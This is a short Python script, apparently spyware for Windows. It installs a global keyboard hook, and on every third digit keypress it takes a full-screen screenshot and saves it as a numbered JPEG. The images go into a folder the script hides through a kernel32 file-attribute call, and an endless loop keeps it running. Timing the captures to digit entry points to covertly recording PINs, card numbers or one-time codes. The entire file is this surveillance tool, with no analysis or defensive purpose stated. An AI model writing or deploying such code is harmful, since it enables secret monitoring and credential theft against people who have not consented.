import keyboard
import os
import ctypes
import pyautogui


file_number = 0
shot_pressed = 0


def check_prep(path):
    if not os.path.exists(path):
        os.makedirs(path)
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ret = ctypes.windll.kernel32.SetFileAttributesW(path, FILE_ATTRIBUTE_HIDDEN)


i = 1
path = ".hidden_folder"
check_prep(path)


def save_file(num):
    im = pyautogui.screenshot()
    name_file = path + "/" + str(num) + ".jpg"
    num += 1
    print(name_file)
    im.save(name_file)


def on_press_reaction(event):
    global shot_pressed
    global i
    global file_number
    if event.name.isdigit():
        shot_pressed += 1
        if i == 3:
            print("prova")
            save_file(file_number)
            file_number += 1
            i = 0
        i += 1


keyboard.on_press(on_press_reaction)

while True:
    pass


